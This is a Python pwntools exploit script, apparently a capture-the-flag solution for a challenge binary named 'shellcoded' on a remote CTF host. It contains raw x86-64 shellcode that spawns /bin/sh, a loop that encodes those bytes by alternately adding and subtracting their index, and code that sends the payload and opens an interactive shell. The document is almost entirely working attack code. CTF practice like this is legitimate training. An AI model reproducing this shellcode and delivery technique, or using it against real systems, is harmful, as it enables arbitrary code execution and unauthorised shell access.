#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shellcoded
import struct
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shellcoded')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

HOST, PORT = ('challenge.ctf.games', 32383)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

p = lambda v: p8(v)

io = start()

io.recvline()
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x90\x90"
new_shellcode = b""
for i in range(len(shellcode)):
    print(shellcode[i])
    if not i % 2:
        val = shellcode[i] - i
        new_shellcode += p(val % 256)
        print(val)
        continue
    val = shellcode[i] + i
    new_shellcode += p(val % 256)
    print(val)

log.info("Sending shellcode: {}".format(new_shellcode))

io.sendline(new_shellcode)

io.interactive()

